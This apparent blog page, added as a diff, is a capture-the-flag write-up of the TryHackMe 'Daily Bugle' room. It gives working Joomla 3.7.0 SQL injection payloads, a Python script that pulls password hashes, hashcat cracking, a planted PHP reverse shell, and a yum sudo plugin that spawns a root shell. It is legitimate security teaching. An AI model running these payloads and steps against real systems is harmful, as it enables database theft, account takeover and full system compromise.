@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TryHackMe | Daily Bugle</title>
+    <link rel="stylesheet" href="/styles/base.css">
+    <link rel="stylesheet" href="/styles/shared/header.css">
+    <link rel="stylesheet" href="/styles/shared/footer.css">
+    <link rel="stylesheet" href="/styles/shared/thmLabs.css">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+</head>
+
+<body>
+    <!-- Header Container  -->
+    <div id="header-container"></div>
+
+    <!-- Body Container  -->
+    <main id="main">
+        <h1>TryHackMe | Daily Bugle</h1>
+
+        <div class="dailybugle0">
+            <img src="/assets/images/thmImages/thm-dailyBugle.png" alt="Daily Bugle" />
+        </div>
+
+        <p id="extLink" onclick="window.open('https://tryhackme.com/room/dailybugle', '_blank')">☍ Room Link -
+            "https://tryhackme.com/room/dailybugle"</p><br>
+
+        <blockquote>
+            <p>Hello fellow hackers, learners, and security enthusiasts! 💻</p><br>
+            <p>Welcome to my corner of the internet where I document my path through the exciting world of penetration
+                testing and cybersecurity. Whether you're here to follow along, learn together, or just curious about
+                ethical hacking - I'm glad you stopped by!
+            </p>
+        </blockquote><br>
+
+        <h2>⚝ Introduction</h2>
+
+        <p>This writeup walks through the <strong>"Daily Bugle"</strong> challenge from <strong>TryHackMe</strong>.
+            You'll follow a step-by-step journey from initial reconnaissance to full system compromise, including the
+            real-world trial and errors encountered along the way.
+        </p>
+
+        <p><strong>👉 In this guide, you'll learn :</strong></p>
+        <ul>
+            <li><strong>Network Enumeration</strong> using <strong><code>nmap</code></strong> and
+                <strong><code>gobuster</code></strong> for service discovery
+            </li>
+            <li><strong>Web Application Exploitation</strong> of a vulnerable application</li>
+            <li><strong>Database Attacks</strong> through crafted SQL injection payloads</li>
+            <li><strong>Password Cracking</strong> with <strong><code>hashcat</code></strong> to recover credentials
+            </li>
+            <li><strong>Privilege Escalation</strong> using <strong><code>linpeas</code></strong> for automated vector
+                discovery</li>
+            <li><strong>Binary Abuse</strong> leveraging <strong><code>yum</code></strong> with sudo rights for root
+                access</p>
+            </li>
+        </ul>
+        <br>
+
+        <p>Grab a coffee and let's get started! ☕</p><br>
+
+        <p><strong>📋 Machine Descriptions and Tasks -</strong></p>
+        <ul>
+            <li>Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by
+                taking advantage of yum.</li>
+            <li>We have to answer three questions and collect two flags (user flag and root flag).</li>
+        </ul>
+        <br>
+
+        <h2>⚝ Enumeration</h2>
+
+        <p>First, I started with a basic <strong>nmap</strong> scan.</p>
+
+        <p><strong>Nmap Scan Results -</strong> </p>
+
+        <pre><code class="shell"> ➥ $ nmap -sCV -p- 10.80.132.94
+
+Nmap scan report for 10.80.132.94
+Host is up (0.022s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+
+PORT     STATE SERVICE VERSION
+
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
+|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
+|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
+
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-title: Home
+|_http-generator: Joomla! - Open Source Content Management
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
+
+3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.27 seconds
+        </code></pre>
+
+        <p><strong>✦ Command Explanation -</strong></p>
+        <ul>
+            <li><strong>nmap</strong> , network exploration tool and security / port scanner.</li>
+            <li><strong>-sC</strong> , for default script.</li>
+            <li><strong>-sV</strong> , for service/version info.</li>
+            <li><strong>-p-</strong> , to scan ports from 1 through 65535.</li>
+        </ul>
+        <br>
+
+        <p id="extLink"
+            onclick="window.open('https://manpages.ubuntu.com/manpages/trusty/en/man1/nmap.1.html', '_blank')">
+            🕮 Read More - "https://manpages.ubuntu.com/manpages/trusty/en/man1/nmap.1.html"</p>
+        <br>
+
+        <p><strong>👆 From the above scan results -</strong></p>
+        <ul>
+            <li><strong>Port 22</strong> : 'OpenSSH' server and The service is running on port 22</li>
+            <li><strong>Port 80</strong> : 'Apache' web server</li>
+            <li><strong>Port 3306</strong> : Running a 'MySQL' server</li>
+        </ul>
+        <br>
+
+        <p><strong>Note</strong> : It shows <strong><code>'http-robots.txt: 15 disallowed entries'</code></strong> ,
+            that's interesting. I have visited the
+            web page to gather more information and got a clue for the first question.
+        </p>
+        <br>
+
+        <p>Landing Page - <strong>"http://TARGET_IP"</strong></p>
+        <img alt="Home Page" src="/assets/images/thmImages/thm-dailyBugle-pic1.png" />
+        <br>
+
+        <p><strong>Q1. Access the web server, who robbed the bank?</strong></p>
+        <br>
+
+        <p>I have seen <code>'15 disallowed entries'</code> from the last nmap scan and I did checked the
+            <code>'robots.txt'</code> file.
+        </p>
+        <br>
+
+        <p><strong><code>robots.txt</code></strong> - "http://TARGET_IP/robots.txt"</p>
+        <br>
+
+        <pre><code># If the Joomla site is installed within a folder 
+# eg www.example.com/joomla/ then the robots.txt file 
+# MUST be moved to the site root 
+# eg www.example.com/robots.txt
+# AND the joomla folder name MUST be prefixed to all of the
+# paths. 
+# eg the Disallow rule for the /administrator/ folder MUST 
+# be changed to read 
+# Disallow: /joomla/administrator/
+#
+# For more information about the robots.txt standard, see:
+# http://www.robotstxt.org/orig.html
+#
+# For syntax checking, see:
+# http://tool.motoricerca.info/robots-checker.phtml
+
+User-agent: *
+Disallow: /administrator/
+Disallow: /bin/
+Disallow: /cache/
+Disallow: /cli/
+Disallow: /components/
+Disallow: /includes/
+Disallow: /installation/
+Disallow: /language/
+Disallow: /layouts/
+Disallow: /libraries/
+Disallow: /logs/
+Disallow: /modules/
+Disallow: /plugins/
+Disallow: /tmp/
+        </code></pre>
+        <br>
+
+        <p>Just to get more about the web site and also to reveal if there any hidden directories, I did a
+            <strong>gobuster</strong> scan. See the results below -
+        </p>
+        <br>
+
+        <p><strong>Gobuster Scan Results :</strong></p>
+        <pre><code class="shell"> ➥ $ gobuster dir -u http://10.80.132.94/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.80.132.94/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+.htpasswd            (Status: 403) [Size: 211]
+.htaccess            (Status: 403) [Size: 211]
+administrator        (Status: 301) [Size: 242] [--&gt; http://10.80.132.94/administrator/]
+bin                  (Status: 301) [Size: 232] [--&gt; http://10.80.132.94/bin/]
+cache                (Status: 301) [Size: 234] [--&gt; http://10.80.132.94/cache/]
+cgi-bin/             (Status: 403) [Size: 210]
+cli                  (Status: 301) [Size: 232] [--&gt; http://10.80.132.94/cli/]
+components           (Status: 301) [Size: 239] [--&gt; http://10.80.132.94/components/]
+images               (Status: 301) [Size: 235] [--&gt; http://10.80.132.94/images/]
+includes             (Status: 301) [Size: 237] [--&gt; http://10.80.132.94/includes/]
+language             (Status: 301) [Size: 237] [--&gt; http://10.80.132.94/language/]
+layouts              (Status: 301) [Size: 236] [--&gt; http://10.80.132.94/layouts/]
+libraries            (Status: 301) [Size: 238] [--&gt; http://10.80.132.94/libraries/]
+media                (Status: 301) [Size: 234] [--&gt; http://10.80.132.94/media/]
+modules              (Status: 301) [Size: 236] [--&gt; http://10.80.132.94/modules/]
+plugins              (Status: 301) [Size: 236] [--&gt; http://10.80.132.94/plugins/]
+robots.txt           (Status: 200) [Size: 836]
+templates            (Status: 301) [Size: 238] [--&gt; http://10.80.132.94/templates/]
+tmp                  (Status: 301) [Size: 232] [--&gt; http://10.80.132.94/tmp/]
+Progress: 20481 / 20481 (100.00%)
+===============================================================
+Finished
+===============================================================
+        </code></pre>
+        <br>
+
+        <p>I got a few extra information from the scan. Most of them are already mentioned in the
+            <strong><code>robots.txt</code></strong> file.
+        </p>
+        <br>
+
+        <p>I visited <strong>"http://TARGET_IP/administrator/"</strong> and got a login page.</p>
+        <img alt="Joomla Login" src="/assets/images/thmImages/thm-dailyBugle-pic2.png" />
+        <br>
+
+        <h2>⚝ Exploitation</h2>
+
+        <p>I tried to login with some basic combinations but no luck there. So, I searched google for
+            <strong><code>'Joomla exploits'</code></strong> and found this nice guide on how to attack and break into
+            joomla based websites.
+        </p>
+        <br>
+
+        <p id="extLink" onclick="window.open('https://hackertarget.com/attacking-enumerating-joomla/', '_blank')">
+            Check Here - "https://hackertarget.com/attacking-enumerating-joomla/"
+        </p>
+        <br>
+
+        <p>To get the proper exploit, I have to detect the joomla version running on the target system. From the above
+            guide, I knew that we can get the version from the <strong><code>joomla.xml</code></strong> file within the
+            directory <strong><code>'/administrator/manifests/files/'</code></strong>.
+        </p>
+        <br>
+
+        <p><strong>Joomla version</strong> - "http://TARGET_IP/administrator/manifests/files/joomla.xml"</p>
+        <p><img alt="Joomla Version" src="/assets/images/thmImages/thm-dailyBugle-pic3.png" /></p>
+        <br>
+
+        <p>We got the answer to the our second question - <strong>What is the Joomla version?</strong></p>
+        <br>
+
+        <p>I modified my google search to <code>'Joomla 3.7.0 exploits'</code> and the first link I got is for
+            <strong><code>exploit-db</code></strong>.
+        </p>
+        <br>
+
+        <p><strong>Exploit Details</strong> : Joomla! 3.7.0 - 'com_fields' SQL Injection - CVE-2017-8917. Check the
+            exploit - <a href="https://www.exploit-db.com/exploits/42033"
+                target="_blank">"https://www.exploit-db.com/exploits/42033"</a>.
+        </p>
+        <br>
+
+        <p id="extLink"
+            onclick="window.open('https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html', '_blank')">
+            🕮 Read More - "https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html"
+        </p>
+        <br>
+
+        <p>Based on the <strong><code>exploit-db</code></strong> guide, I identified a vulnerable endpoint and parameter
+            with three attack vectors. Testing each revealed the target is vulnerable to
+            <strong><code>error-based SQL injection</code></strong>.
+            See the SQL query below :
+        </p>
+        <br>
+
+        <pre><code class="language-CVE">Type: error-based
+Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)
+Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+        </code></pre>
+        <br>
+
+        <p>I modified my payload as follows with the target IP - </p><br>
+        <pre><code>http://10.80.132.94/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT%206600%20FROM(SELECT%20COUNT(*),CONCAT(0x7171767071,(SELECT%20(ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)
+        </code></pre>
+        <br>
+
+        <p>I got a response from the server which is an error message. The error response from the server confirms
+            successful
+            exploitation of the error-based SQL injection vulnerability. As intended, the payload triggered a database
+            error
+            that disclosed sensitive information in the error message, validating both the vulnerability presence and
+            payload
+            effectiveness.
+        </p>
+        <br>
+        <img alt="SQL Injection" src="/assets/images/thmImages/thm-dailyBugle-pic4.png" />
+        <br>
+
+        <p><strong>👉 Explanation :</strong></p>
+        <ul>
+            <li>The error message <strong>"Duplicate entry 'qqvpq1qjpvq1' for key 'group_key'"</strong> demonstrates a
+                successful error-based SQL injection attack. The hexadecimal strings <strong><code>qqvpq</code></strong>
+                (0x7171767071) and <strong><code>qjpvq</code></strong> (0x716a707671)
+                serve as wrapper markers deliberately placed around our target output to make the extracted data clearly
+                visible within the error response. The critical value <strong><code>'1'</code></strong> appearing
+                between these markers represents the successful execution of our injected SQL query, specifically from
+                the <strong><code>ELT(6600=6600,1)</code></strong> function which evaluates to 1 when the true condition
+                is met.
+            </li>
+        </ul>
+        <br>
+
+        <p>I modified the exploit a bit and created a python script for the demonstration purposes.</p>
+        <br>
+        <p><strong>Query Script ( Python ) :</strong> </p>
+
+        <pre><code class="python">#!/usr/bin/env python3
+
+import requests
+import re
+
+target = &quot;http://10.80.132.94/index.php?&quot;
+first = &quot;option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x4f4f4f,&quot;
+
+query = input(&quot;Enter your QUERY : &quot;)
+
+last = &quot;,0x4f4f4f,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&quot;
+
+url = target + first + query + last
+
+# OR, Simply
+
+# url = f&quot;http://10.80.132.94/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x4f4f4f,{query},0x4f4f4f,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&quot;
+
+res = requests.get(url)
+
+data = re.findall(r&quot;&amp;#039;(.*?)&amp;#039;&quot;, res.text)[:2]
+print(data)
+        </code></pre>
+        <br>
+
+        <p>Check the below image, I did a few more queries and finally retrieved the password hash.</p>
+        <img alt="Shell Output" src="/assets/images/thmImages/thm-dailyBugle-pic5.png" />
+        <br>
+
+        <p><strong>1. Database Version</strong></p>
+        <pre><code>(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT @@version),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+</code></pre>
+        <p><strong>2. Current Database</strong></p>
+        <pre><code>(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT database()),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+</code></pre>
+        <p><strong>3. Joomla Usernames</strong></p>
+        <pre><code>(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT username FROM %23__users LIMIT 0,1),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+</code></pre>
+        <p><strong>4. Joomla Passwords</strong></p>
+        <pre><code>(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT password FROM %23__users LIMIT 0,1),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+</code></pre>
+
+        <br>
+        <p><strong>👆 Note :</strong></p>
+        <ul>
+            <li>An important limitation to consider is that the error message returned by the server can only contain a
+                maximum of
+                64 characters. This means if you use the original '0x7171767071' wrapper as specified in the payload,
+                you risk
+                losing portions of the actual hash string since our target hash contains 61 characters. To work around
+                this
+                constraint, you have two practical options: either shorten the wrapper length as demonstrated in
+                previous attempts,
+                or split the extraction query into multiple segments. For instance, you can retrieve the first 30
+                characters using
+                "(SELECT SUBSTRING(password,1,30) FROM %23__users LIMIT 0,1)" and then obtain the remaining portion with
+                "(SELECT
+                SUBSTRING(password,31,60) FROM %23__users LIMIT 0,1)" to successfully capture the complete hash within
+                the server's
+                character limitations.</li>
+        </ul>
+        <br>
+
+        <p>I tried to crack the hash using <strong><code>hashcat</code></strong> with popular
+            <strong><code>rockyou.txt</code></strong> wordlist (You can check
+            the hash type from any online hash identifier site).
+        </p>
+        <pre><code class="language-shell">$ hashcat -m 3200 -a 0 crack.txt /usr/share/wordlists/rockyou.txt</code></pre>
+        <br>
+
+        <p>After several minutes of processing, <strong>'hashcat'</strong> successfully cracked the password hash,
+            revealing the cleartext credentials.
+        </p>
+        <img alt="Cracked Hash" src="/assets/images/thmImages/thm-dailyBugle-pic6.png" />
+        <br>
+
+        <p>This is the answer to our third question - <strong>What is Jonah's cracked password?</strong></p>
+        <br>
+        <p>Now, let's login with the credentials we got - "http://TARGET_IP/administrator/".</p>
+        <img alt="Joomla Login" src="/assets/images/thmImages/thm-dailyBugle-pic7.png" />
+        <br>
+
+        <p>After Login, I got the below page and from the left panel I selected the <strong>'Templates'</strong> option,
+            mainly to check active template.
+        </p>
+        <img alt="Account Access" src="/assets/images/thmImages/thm-dailyBugle-pic8.png" />
+        <br>
+
+        <p>I can see that the <strong>'protostar'</strong> is the default template for all pages in the website.
+        </p>
+        <img alt="Default Template" src="/assets/images/thmImages/thm-dailyBugle-pic9.png" />
+        <br>
+
+        <p>I selected <strong>'Templates'</strong> option from there to customize the <strong>'protostar'</strong>
+            template and modified the <strong>'error.php'</strong> file (the error page).
+        </p>
+        <img alt="PHP file modification" src="/assets/images/thmImages/thm-dailyBugle-pic10.png" />
+        <br>
+
+        <p>Here, I replaced the <strong>'error.php'</strong> file's content with this excellent <strong>PHP Reverse
+                Shell script</strong> -
+            <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"
+                target="_blank">"https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"</a>.
+            and saved our custom php file in the server.
+        </p>
+        <br>
+
+        <p><strong>Custom PHP File :</strong> </p>
+        <img alt="Custom PHP File" src="/assets/images/thmImages/thm-dailyBugle-pic11.png" />
+        <br>
+
+        <p>I started a netcat listner on the specified port and visited
+            <strong>"http://TARGET_IP/templates/protostar/error.php"</strong>
+            (where the php file is located) to execute the custom <strong>'error.php'</strong> and I received a response
+            from the target server.
+        </p>
+        <br>
+
+        <h2>⚝ Initial Access</h2>
+
+        <p>Upon obtaining the initial shell, I immediately upgraded it using the Python pty module and exported xterm
+            for
+            stabilization, establishing a fully interactive TTY session. I discovered a user home directory named
+            <strong>'jjameson'</strong> within the system. However, our current <strong>'apache'</strong> user lacks the
+            necessary read permissions to access this directory, indicating potential privilege separation that requires
+            further
+            escalation.
+        </p>
+        <br>
+        <img alt="Initial Access" src="/assets/images/thmImages/thm-dailyBugle-pic12.png" />
+        <br>
+
+        <p>After conducting basic manual enumeration — including checking for <strong>SUID</strong> binaries with
+            <strong><code>'find / -type f -perm -4000 2&gt;/dev/null'</code></strong> and reviewing scheduled tasks via
+            <strong><code>'cat /etc/crontab'</code></strong> — I found no immediately useful attack vectors. With manual
+            approaches exhausted, I proceeded to run an automated privilege escalation assessment using
+            <strong>LinPEAS</strong>.
+        </p>
+        <br>
+
+        <p id="extLink"
+            onclick="window.open('https://github.com/peass-ng/PEASS-ng/releases/download/20251115-74c9337c/linpeas.sh', '_blank')">
+            'LinPEAS' - "https://github.com/peass-ng/PEASS-ng/releases/download/20251115-74c9337c/linpeas.sh"
+        </p>
+        <br>
+
+        <p>To deploy <strong>LinPEAS</strong>, I first downloaded the script from its official repository and hosted it
+            locally via Python's HTTP server module. The script was then transferred to the target machine, made
+            executable using <strong><code>'chmod +x linpeas.sh'</code></strong>, and executed with
+            <strong><code>'./linpeas.sh'</code></strong> to systematically identify potential
+            privilege escalation paths.
+        </p>
+        <img alt="Linpeas Output" src="/assets/images/thmImages/thm-dailyBugle-pic13.png" />
+        <br>
+
+        <p>Well, we can see from the above output that there is a hard-coded file <strong>(configuation.php)</strong>
+            which contains the password for user <strong>'jjameson'</strong>.
+        </p>
+        <p>I logged in with the above password as user <strong>'jjameson'</strong> and got the <strong>'user
+                flag'</strong> inside home directory.
+        </p>
+        <img alt="User Access" src="/assets/images/thmImages/thm-dailyBugle-pic14.png" />
+        <br>
+
+        <h2>⚝ Privilege Escalation</h2>
+
+        <p>The <strong><code>'sudo -l'</code></strong> command revealed that the current user has password-less sudo
+            rights to execute
+            <strong><code>'/usr/bin/yum'</code></strong> with root privileges.
+        </p>
+        <img alt="Sudo Binary" src="/assets/images/thmImages/thm-dailyBugle-pic15.png" />
+        <br>
+
+        <p>Following GTFOBins documentation for <strong>'yum'</strong>, I confirmed that this binary can be exploited by
+            loading
+            a malicious plugin to spawn an interactive root shell, providing a clear path for privilege escalation.
+        </p>
+        <p id="extLink" onclick="window.open('https://gtfobins.github.io/gtfobins/yum/#sudo', '_blank')">
+            Check Here - "https://gtfobins.github.io/gtfobins/yum/#sudo"
+        </p>
+        <img alt="GTFO Bins" src="/assets/images/thmImages/thm-dailyBugle-pic15-1.png" />
+        <br>
+
+        <p><strong>👉 Spawning a root shell :</strong></p>
+        <br>
+
+        <p>Follow the detailed steps - </p>
+
+        <ol>
+            <li>Created a temporary directory (usually in <strong><code>/tmp/</code></strong>) and stored the generated
+                directory path in a variable called <strong><code>TF</code></strong>.
+            </li>
+            <pre><code class="shell">TF=$(mktemp -d)</code></pre>
+            <li>Created a file named <strong><code>x</code></strong> in that temporary directory and
+                <strong>'&lt;&lt;EOF'</strong> used here to write multiple lines.
+            </li>
+            <pre><code class="shell">cat &gt;$TF/x&lt;&lt;EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF</code></pre>
+            <li>Created a file named <strong><code>y.conf</code></strong> in that temporary directory with the following
+                lines.</li>
+            <pre><code class="shell">cat &gt;$TF/y.conf&lt;&lt;EOF
+[main]
+enabled=1
+EOF</code></pre>
+            <li>Created another file named <strong><code>y.py</code></strong> in that temporary directory with the
+                following lines.</li>
+            <pre><code class="shell">cat &gt;$TF/y.py&lt;&lt;EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+EOF</code></pre>
+            <li>Lastly, executed <strong>'yum'</strong> with root privileges (thanks to
+                <strong><code>NOPASSWD</code></strong> access) and used our custom
+                config file that forces our crafted plugin to run.
+            </li>
+            <pre><code class="language-shell">sudo /usr/bin/yum -c $TF/x --enableplugin=y</code></pre>
+        </ol>
+        <br>
+
+        <p><strong>Check the below images for visual representation - </strong></p>
+        <img alt="Priv Esc 1" src="/assets/images/thmImages/thm-dailyBugle-pic16.png" />
+        <img alt="Priv Esc 2" src="/assets/images/thmImages/thm-dailyBugle-pic17.png" />
+        <br>
+
+        <p>Finally, I got the <strong>'root flag'</strong> inside root user <strong>'/home'</strong> directory.</p>
+        <img alt="Root Flag" src="/assets/images/thmImages/thm-dailyBugle-pic18.png" />
+        <br>
+
+        <p id="congrt">💻 Happy Hacking 💻</p>
+
+    </main>
+
+    <!-- Footer Container  -->
+    <div id="footer-container"></div>
+
+    <!-- Scripts  -->
+    <script src="/scripts/main.js"></script>
+
+</body>
+
+</html>
